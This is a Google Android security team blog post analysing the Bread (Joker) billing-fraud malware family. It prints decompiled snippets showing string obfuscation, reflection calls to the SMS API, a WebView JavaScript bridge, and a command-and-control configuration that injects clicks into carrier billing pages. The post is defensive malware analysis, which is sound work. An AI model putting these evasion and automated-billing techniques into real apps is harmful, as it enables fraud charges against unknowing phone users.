---
title: 'PHA Family Highlights: Bread (and Friends)'
date: 2020-01-09T22:40:00+01:00
draft: false
---

Posted by Alec Guertin and Vadim Kotov, Android Security & Privacy Team  

[![](https://2.bp.blogspot.com/-PWiUDSTmfKs/XheBpPcUbtI/AAAAAAAABhk/pjk_eKO_ThQGIf0eO51wDpJTxHfRHaLKwCNcBGAsYHQ/s640/phaFamilyHighlights_Bread.png)](https://2.bp.blogspot.com/-PWiUDSTmfKs/XheBpPcUbtI/AAAAAAAABhk/pjk_eKO_ThQGIf0eO51wDpJTxHfRHaLKwCNcBGAsYHQ/s1600/phaFamilyHighlights_Bread.png)

In this edition of our **PHA Family Highlights** series we introduce Bread, a large-scale billing fraud family. We first started tracking Bread (also known as Joker) in early 2017, identifying apps designed solely for [SMS fraud](https://developers.google.com/android/play-protect/phacategories#billing-fraud). As the Play Store has introduced new policies and Google Play Protect has scaled defenses, Bread apps were forced to continually iterate to search for gaps. They have at some point used just about every cloaking and obfuscation technique under the sun in an attempt to go undetected. Many of these samples appear to be designed specifically to attempt to slip into the Play Store undetected and are not seen elsewhere. In this post, we show how Google Play Protect has defended against a well organized, persistent attacker and share examples of their techniques.  
  

TL;DR
=====

*   Google Play Protect detected and removed 1.7k unique Bread apps from the Play Store before ever being downloaded by users
*   Bread apps originally performed SMS fraud, but have largely abandoned this for WAP billing following the introduction of [new Play policies](https://android-developers.googleblog.com/2019/01/reminder-smscall-log-policy-changes.html) restricting use of the SEND\_SMS permission and increased coverage by Google Play Protect
*   More information on stats and relative impact is available in the [Android Security 2018 Year in Review report](https://www.blog.google/products/android-enterprise/look-back-2018-android-security-privacy-year-review/)

BILLING FRAUD
=============

Bread apps typically fall into two categories: SMS fraud (older versions) and toll fraud (newer versions). Both of these types of fraud take advantage of mobile billing techniques involving the user’s carrier.  

SMS Billing
-----------

Carriers may partner with vendors to allow users to pay for services by SMS. The user simply needs to text a prescribed keyword to a prescribed number (shortcode). A charge is then added to the user’s bill with their mobile service provider.  

[![](https://3.bp.blogspot.com/-6QpSaC45Hss/XheByebta6I/AAAAAAAABho/lJzEuRwfbp8dqJ9hxPPZAgr9aUgQ2jrhgCNcBGAsYHQ/s400/billFraud.png)](https://3.bp.blogspot.com/-6QpSaC45Hss/XheByebta6I/AAAAAAAABho/lJzEuRwfbp8dqJ9hxPPZAgr9aUgQ2jrhgCNcBGAsYHQ/s1600/billFraud.png)

Toll Billing
------------

Carriers may also provide payment endpoints over a web page. The user visits the URL to complete the payment and enters their phone number. Verification that the request is coming from the user’s device is completed using two possible methods:  

1.  The user connects to the site over mobile data, not WiFi (so the service provider directly handles the connection and can validate the phone number); or
2.  The user must retrieve a code sent to them via SMS and enter it into the web page (thereby proving access to the provided phone number).

Fraud
-----

Both of the billing methods detailed above provide device verification, but not user verification. The carrier can determine that the request originates from the user’s device, but does not require any interaction from the user that cannot be automated. Malware authors use injected clicks, custom HTML parsers and SMS receivers to automate the billing process without requiring any interaction from the user.  

STRING & DATA OBFUSCATION
=========================

Bread apps have used many innovative and classic techniques to hide strings from analysis engines. Here are some highlights.  

Standard Encryption
-------------------

Frequently, Bread apps take advantage of standard crypto libraries in \`java.util.crypto\`. We have discovered apps using AES, Blowfish, and DES as well as combinations of these to encrypt their strings.  

Custom Encryption
-----------------

Other variants have used custom-implemented encryption algorithms. Some common techniques include: basic XOR encryption, nested XOR and custom key-derivation methods. Some variants have gone so far as to use a different key for the strings of each class.  

Split Strings
-------------

Encrypted strings can be a signal that the code is trying to hide something. Bread has used a few tricks to keep strings in plaintext while preventing basic string matching.  
```
String click\_code = new StringBuilder().append(".cli").append("ck();");  

```Going one step further, these substrings are sometimes scattered throughout the code, retrieved from static variables and method calls. Various versions may also change the index of the split (e.g. “.clic” and “k();”).  

Delimiters
----------

Another technique to obfuscate unencrypted strings uses repeated delimiters. A short, constant string of characters is inserted at strategic points to break up keywords:  
```
String js = "javm6voTascrm6voTipt:window.SDFGHWEGSG.catcm6voThPage(docm6voTument.getElemm6voTentsByTm6voTagName('html')\[m6voT0\].innerHTML);"  

```At runtime, the delimiter is removed before using the string:  
```
js = js.replaceAll("m6voT", "");  

```

API OBFUSCATION
===============

SMS and toll fraud generally requires a few basic behaviors (for example, disabling WiFi or accessing SMS), which are accessible by a handful of APIs. Given that there are a limited number of behaviors required to identify billing fraud, Bread apps have had to try a wide variety of techniques to mask usage of these APIs.  

Reflection
----------

Most methods for hiding API usage tend to use Java reflection in some way. In some samples, Bread has simply directly called the Reflect API on strings decrypted at runtime.  
```
Class smsManagerClass = Class.forName(p.a().decrypt("wI7HmhUo0OYTnO2rFy3yxE2DFECD2I9reFnmPF3LuAc="));  // android.telephony.SmsManager  
smsManagerClass.getMethod(p.a().decrypt("0oXNjC4kzLwqnPK9BiL4qw=="),  // sendTextMessage     
                          String.class, String.class, String.class, PendingIntent.class, PendingIntent.class).invoke(smsManagerClass.getMethod(p.a().decrypt("xoXXrB8n1b0LjYfIYUObrA==")).invoke(null), addr, null, message, null, null);  // getDefault  

```

JNI
---

Bread has also tested our ability to analyze native code. In one sample, no SMS-related code appears in the DEX file, but there is a native method registered.  
```
 public static native void nativesend(String arg0, String arg1);
```Two strings are passed into the call, the shortcode and keyword used for SMS billing (getter methods renamed here for clarity).  
```
 JniManager.nativesend(this.get\_shortcode(), this.get\_keyword());
```In the native library, it stores the strings to access the SMS API.  

[![](https://3.bp.blogspot.com/-zLOp5jbuEc0/XheCKNZr0uI/AAAAAAAABh0/k6RjTRl4458lH8oHv7lKgglyhMYogZJpQCNcBGAsYHQ/s1600/stringsShadow.png)](https://3.bp.blogspot.com/-zLOp5jbuEc0/XheCKNZr0uI/AAAAAAAABh0/k6RjTRl4458lH8oHv7lKgglyhMYogZJpQCNcBGAsYHQ/s1600/stringsShadow.png)

The `nativesend` method uses the Java Native Interface (JNI) to fetch and call the Android SMS API. The following is a screenshot from IDA with comments showing the strings and JNI functions.  

[![](https://2.bp.blogspot.com/-ZpFyeTuuLJc/XheCU0N8YDI/AAAAAAAABh4/XK_Ai6V6aGQGS34BIBMfsHutxaa-LjoLwCNcBGAsYHQ/s1600/nativesend2Shadow.png)](https://2.bp.blogspot.com/-ZpFyeTuuLJc/XheCU0N8YDI/AAAAAAAABh4/XK_Ai6V6aGQGS34BIBMfsHutxaa-LjoLwCNcBGAsYHQ/s1600/nativesend2Shadow.png)

WebView JavaScript Interface
----------------------------

Continuing on the theme of cross-language bridges, Bread has also tried out some obfuscation methods utilizing JavaScript in WebViews. The following method is declared in the DEX.  
```
 public void method1(String p7, String p8, String p9, String p10, String p11) {   
            Class v0\_1 = Class.forName(p7);  
            Class\[\] v1\_1 = new Class\[0\];  
            Object\[\] v3\_1 = new Object\[0\];  
            Object v1\_3 = v0\_1.getMethod(p8, v1\_1).invoke(0, v3\_1);  
            Class\[\] v2\_2 = new Class\[5\];  
            v2\_2\[0\] = String.class;  
            v2\_2\[1\] = String.class;  
            v2\_2\[2\] = String.class;  
            v2\_2\[3\] = android.app.PendingIntent.class;  
            v2\_2\[4\] = android.app.PendingIntent.class;  
            reflect.Method v0\_2 = v0\_1.getMethod(p9, v2\_2);  
            Object\[\] v2\_4 = new Object\[5\];  
            v2\_4\[0\] = p10;  
            v2\_4\[1\] = 0;  
            v2\_4\[2\] = p11;  
            v2\_4\[3\] = 0;  
            v2\_4\[4\] = 0;  
            v0\_2.invoke(v1\_3, v2\_4);  
    }
```Without context, this method does not reveal much about its intended behavior, and there are no calls made to it anywhere in the DEX. However, the app does create a WebView and registers a JavaScript interface to this class.  
```
this.webView.addJavascriptInterface(this, "stub");  

```This gives JavaScript run in the WebView access to this method. The app loads a URL pointing to a Bread-controlled server. The response contains some basic HTML and JavaScript.  

[![](https://3.bp.blogspot.com/-ipSmDm073Zg/XheDpw72-yI/AAAAAAAABiU/GWDMyTv4lNw3-yC2ABTJfJCGyGQqIKD4wCNcBGAsYHQ/s1600/Screenshot%2B2020-01-09%2Bat%2B11.48.44%2BAM.png)](https://3.bp.blogspot.com/-ipSmDm073Zg/XheDpw72-yI/AAAAAAAABiU/GWDMyTv4lNw3-yC2ABTJfJCGyGQqIKD4wCNcBGAsYHQ/s1600/Screenshot%2B2020-01-09%2Bat%2B11.48.44%2BAM.png)

In green, we can see the references to the SMS API. In red, we see those values being passed into the suspicious Java method through the registered interface. Now, using these strings `method1` can use reflection to call `sendTextMessage` and process the payment.  

PACKING
=======

In addition to implementing custom obfuscation techniques, apps have used several commercially available packers including: Qihoo360, AliProtect and SecShell.  
More recently, we have seen Bread-related apps trying to hide malicious code in a native library shipped with the APK. Earlier this year, we discovered apps hiding a JAR in the data section of an ELF file which it then dynamically loads using `DexClassLoader`.  
The figure below shows a fragment of encrypted JAR stored in .rodata section of a shared object shipped with the APK as well as the XOR key used for decryption.  

[![](https://2.bp.blogspot.com/-3_HqCDUH5-k/XheD302CBwI/AAAAAAAABic/2W-uZtt0EccJIiZktzJ-Xl_k5iBg1_WeACNcBGAsYHQ/s1600/ida-screenshotShadow.png)](https://2.bp.blogspot.com/-3_HqCDUH5-k/XheD302CBwI/AAAAAAAABic/2W-uZtt0EccJIiZktzJ-Xl_k5iBg1_WeACNcBGAsYHQ/s1600/ida-screenshotShadow.png)

After we blocked those samples, they moved a significant portion of malicious functionality into the native library, which resulted in a rather peculiar back and forth between Dalvik and native code:  

[![](https://4.bp.blogspot.com/-hIBpWIptZhY/XheEG0O8G9I/AAAAAAAABik/ZK_HKKw-IYQOJz4704_6Ub-kTK_WMFOtQCNcBGAsYHQ/s1600/sqwzJ9G8weGFxDnqqfmrT6Q.png)](https://4.bp.blogspot.com/-hIBpWIptZhY/XheEG0O8G9I/AAAAAAAABik/ZK_HKKw-IYQOJz4704_6Ub-kTK_WMFOtQCNcBGAsYHQ/s1600/sqwzJ9G8weGFxDnqqfmrT6Q.png)

COMMAND & CONTROL
=================

Dynamic Shortcodes & Content
----------------------------

Early versions of Bread utilized a basic command and control infrastructure to dynamically deliver content and retrieve billing details. In the example server response below, the green fields show text to be shown to the user. The red fields are used as the shortcode and keyword for SMS billing.  

[![](https://3.bp.blogspot.com/-rzKSWBbVVSU/XheEXKhufUI/AAAAAAAABiw/TM-FWaEsFBoy708X02m3Ip4l25_RrfKpgCNcBGAsYHQ/s1600/Screenshot%2B2020-01-09%2Bat%2B11.51.43%2BAM.png)](https://3.bp.blogspot.com/-rzKSWBbVVSU/XheEXKhufUI/AAAAAAAABiw/TM-FWaEsFBoy708X02m3Ip4l25_RrfKpgCNcBGAsYHQ/s1600/Screenshot%2B2020-01-09%2Bat%2B11.51.43%2BAM.png)

State Machines
--------------

Since various carriers implement the billing process differently, Bread has developed several variants containing generalized state machines implementing all possible steps. At runtime, the apps can check which carrier the device is connected to and fetch a configuration object from the command and control server. The configuration contains a list of steps to execute with URLs and JavaScript.  
```
{  
   "message":"Success",  
   "result":\[  
      {  
         "list":\[  
            {  
               "endUrl":"http://sabai5555.com/",  
               "netType":0,  
               "number":1,  
               "offerId":"1009",  
               "step":1,  
               "trankUrl": "http://atracking-auto.appflood.com/transaction/post\_click?offer\_id=19190660&aff\_id=10336"  
            },  
            {  
               "netType":0,  
               "number":2,  
               "offerId":"1009",  
               "params":"function jsFun(){document.getElementsByTagName('a')\[1\].click()};",  
               "step":2  
            },  
            {  
               "endUrl":"http://consentprt.dtac.co.th/webaoc/InformationPage",  
               "netType":0,  
               "number":3,  
               "offerId":"1009",  
               "params":"javascript:jsFun()",  
               "step":4  
            },  
            {  
               "endUrl":"http://consentprt.dtac.co.th/webaoc/SuccessPage",  
               "netType":0,  
               "number":4,  
               "offerId":"1009",  
               "params":"javascript:getOk()",  
               "step":3  
            },  
            {  
               "netType":0,  
               "number":5,  
               "offerId":"1009",  
               "step":7  
            }  
         \],  
         "netType":0,  
         "offerId":"1009"  
      }  
   \],  
   "code":"200"  
}  

```The steps implemented include:  

*   Load a URL in a WebView
*   Run JavaScript in WebView
*   Toggle WiFi state
*   Toggle mobile data state
*   Read/modify SMS inbox
*   Solve captchas

### Captchas

One of the more interesting states implements the ability to solve basic captchas (obscured letters and numbers). First, the app creates a JavaScript function to call a Java method, `getImageBase64`, exposed to WebView using `addJavascriptInterface`.  

[![](https://1.bp.blogspot.com/-beXRY3YYo_U/XheEn1rgJzI/AAAAAAAABjE/RJMOhzpSePQeecFRlTNRm0EBOted-ppzgCNcBGAsYHQ/s1600/Screenshot%2B2020-01-09%2Bat%2B11.52.50%2BAM.png)](https://1.bp.blogspot.com/-beXRY3YYo_U/XheEn1rgJzI/AAAAAAAABjE/RJMOhzpSePQeecFRlTNRm0EBOted-ppzgCNcBGAsYHQ/s1600/Screenshot%2B2020-01-09%2Bat%2B11.52.50%2BAM.png)

The value used to replace `GET_IMG_OBJECT` comes from the JSON configuration.  
```
"params": "document.getElementById('captcha')"  

```The app then uses JavaScript injection to create a new script in the carrier’s web page to run the new function.  

[![](https://2.bp.blogspot.com/-6yXas0z0FPQ/XheE2QPJXJI/AAAAAAAABjM/CPS1GniDaz0dMXdnk1cSDO-2P9R-VOmdgCNcBGAsYHQ/s1600/Screenshot%2B2020-01-09%2Bat%2B11.53.51%2BAM.png)](https://2.bp.blogspot.com/-6yXas0z0FPQ/XheE2QPJXJI/AAAAAAAABjM/CPS1GniDaz0dMXdnk1cSDO-2P9R-VOmdgCNcBGAsYHQ/s1600/Screenshot%2B2020-01-09%2Bat%2B11.53.51%2BAM.png)

The base64-encoded image is then uploaded to an image recognition service. If the text is retrieved successfully, the app uses JavaScript injection again to submit the HTML form with the captcha answer.  

CLOAKING
========

Client-side Carrier Checks
--------------------------

In our basic command & control example above, we didn’t address the (incorrectly labeled) “imei” field.  
```
{  
 "button": "ยินดีต้อนรับ",  
 "code": 0,  
 "content": "F10",  
 "imei": "52003,52005,52000",  
 "rule": "Here are all the pictures you need, about             
              happiness, beauty, beauty, etc., with our most          
              sincere service, to provide you with the most   
              complete resources.",  
 "service": "4219245"  
}  

```This contains the Mobile Country Code (MCC) and Mobile Network Code (MNC) values that the billing process will work for. In this example, the server response contains several values for Thai carriers. The app checks if the device’s network matches one of those provided by the server. If it does, it will commence with the billing process. If the value does not match, the app skips the “disclosure” page and billing process and brings the user straight to the app content.  
In some versions, the server would only return valid responses several days after the apps were submitted.  

Server-side Carrier Checks
--------------------------

In the JavaScript bridge API obfuscation example covered above, the server supplied the app with the necessary strings to complete the billing process. However, analysts may not always see the indicators of compromise in the server’s response.  
In this example, the requests to the server take the following form:  
```
http://X.X.X.X/web?operator=52000&id=com.battery.fakepackage&deviceid=deadbeefdeadbeefdeadbeefdeadbeef  

```Here, the “operator” query parameter is the Mobile Country Code and Mobile Network Code . The server can use this information to determine if the user’s carrier is one of Bread’s targets. If not, the response is scrubbed of the strings used to complete the billing fraud.  
```
ไปเดี๋ยวนี้  

  
    

deadbeefdeadbeefdeadbeefdeadbeef 
```

MISLEADING USERS
================

Bread apps sometimes display a pop-up to the user that implies some form of compliance or disclosure, showing **terms and conditions** or a **confirm** button. However, the actual text would often only display a basic welcome message.  

[![](https://3.bp.blogspot.com/-uDitzJbSjf0/XheFFxmZtNI/AAAAAAAABjU/gxpDIHx8rew1aCAwisxncC938p5WkRyFwCNcBGAsYHQ/s400/pastedimage0.png)](https://3.bp.blogspot.com/-uDitzJbSjf0/XheFFxmZtNI/AAAAAAAABjU/gxpDIHx8rew1aCAwisxncC938p5WkRyFwCNcBGAsYHQ/s1600/pastedimage0.png)

_Translation: “This app is a place to be and it will feel like a superhero with this new app. We hope you enjoy it!”_  
Other versions included all the pieces needed for a valid disclosure message.  

[![](https://2.bp.blogspot.com/-h0c8cd3Wdp0/XheFXhd5dxI/AAAAAAAABjg/yV17brL-8lkydFfOtzsJYKFcnoEqAYXIwCNcBGAsYHQ/s400/pastedImage0%25281%2529.png)](https://2.bp.blogspot.com/-h0c8cd3Wdp0/XheFXhd5dxI/AAAAAAAABjg/yV17brL-8lkydFfOtzsJYKFcnoEqAYXIwCNcBGAsYHQ/s1600/pastedImage0%25281%2529.png)

When translated the disclosure reads:  
_“Apply Car Racing Clip \\n Please enter your phone number for service details. \\n Terms and Conditions \\nFrom 9 Baht / day, you will receive 1 message / day. \\nPlease stop the V4 printing service at 4739504 \\n or call 02-697-9298 \\n Monday - Friday at 8.30 - 5.30pm \\n”_  
However, there are still two issues here:  

1.  The numbers to contact for cancelling the subscription are not real
2.  The billing process commences even if you don’t hit the “Confirm” button

Even if the disclosure here displayed accurate information, the user would often find that the advertised functionality of the app did not match the actual content. Bread apps frequently contain no functionality beyond the billing process or simply clone content from other popular apps.  

VERSIONING
==========

Bread has also leveraged an abuse tactic unique to app stores: versioning. Some apps have started with clean versions, in an attempt to grow user bases and build the developer accounts’ reputations. Only later is the malicious code introduced, through an update. Interestingly, early “clean” versions contain varying levels of signals that the updates will include malicious code later. Some are first uploaded with all the necessary code except the one line that actually initializes the billing process. Others may have the necessary permissions, but are missing the classes containing the fraud code. And others have all malicious content removed, except for log comments referencing the payment process. All of these methods attempt to space out the introduction of possible signals in various stages, testing for gaps in the publication process. However, GPP does not treat new apps and updates any differently from an analysis perspective.  

FAKE REVIEWS
============

When early versions of apps are first published, many five star reviews appear with comments like:  
![](https://lh5.googleusercontent.com/FKSIFYZvO3Nno5Zt9ixuDfMsoQ4cCQ-b2o0EqMwU6ffz5e0Q4cmwU8b5W3zaBs-toygv_6q1cDzB4ld1y_zH2zH0MAs5iaddUzuHjSMOwps0mJSVn3WYmRrmOgN4Yavvww-2-eGc)  
  
_“So..good..”_  
_“very beautiful”_  
Later, 1 star reviews from _real_ users start appearing with comments like:  
_“Deception”_  
_“The app is not honest …”_  

SUMMARY
=======

Sheer volume appears to be the preferred approach for Bread developers. At different times, we have seen three or more active variants using different approaches or targeting different carriers. Within each variant, the malicious code present in each sample may look nearly identical with only one evasion technique changed. Sample 1 may use AES-encrypted strings with reflection, while Sample 2 (submitted on the same day) will use the same code but with plaintext strings.  
At peak times of activity, we have seen up to 23 different apps from this family submitted to Play in one day. At other times, Bread appears to abandon hope of making a variant successful and we see a gap of a week or longer before the next variant. This family showcases the amount of resources that malware authors now have to expend. Google Play Protect is constantly updating detection engines and warning users of malicious apps installed on their device.  

SELECTED SAMPLES
================

**Package Name**

**SHA-256 Digest**

com.rabbit.artcamera

18c277c7953983f45f2fe6ab4c7d872b2794c256604e43500045cb2b2084103f

org.horoscope.astrology.predict

6f1a1dbeb5b28c80ddc51b77a83c7a27b045309c4f1bff48aaff7d79dfd4eb26

com.theforest.rotatemarswallpaper

4e78a26832a0d471922eb61231bc498463337fed8874db5f70b17dd06dcb9f09

com.jspany.temp

0ce78efa764ce1e7fb92c4de351ec1113f3e2ca4b2932feef46d7d62d6ae87f5

com.hua.ru.quan

780936deb27be5dceea20a5489014236796a74cc967a12e36cb56d9b8df9bc86

com.rongnea.udonood

8b2271938c524dd1064e74717b82e48b778e49e26b5ac2dae8856555b5489131

com.mbv.a.wp

01611e16f573da2c9dbc7acdd445d84bae71fecf2927753e341d8a5652b89a68

com.pho.nec.sg

b4822eeb71c83e4aab5ddfecfb58459e5c5e10d382a2364da1c42621f58e119b

[![](http://feeds.feedburner.com/~ff/GoogleOnlineSecurityBlog?d=yIl2AUoC8zA)](http://feeds.feedburner.com/~ff/GoogleOnlineSecurityBlog?a=2f6Uowlzm0M:KKWBIo1xyDM:yIl2AUoC8zA) [![](http://feeds.feedburner.com/~ff/GoogleOnlineSecurityBlog?i=2f6Uowlzm0M:KKWBIo1xyDM:V_sGLiPBpWU)](http://feeds.feedburner.com/~ff/GoogleOnlineSecurityBlog?a=2f6Uowlzm0M:KKWBIo1xyDM:V_sGLiPBpWU)

![](http://feeds.feedburner.com/~r/GoogleOnlineSecurityBlog/~4/2f6Uowlzm0M)  
  
from Google Online Security Blog https://ift.tt/36KQ6cY  
via [IFTTT](https://ifttt.com/?ref=da&site=blogger)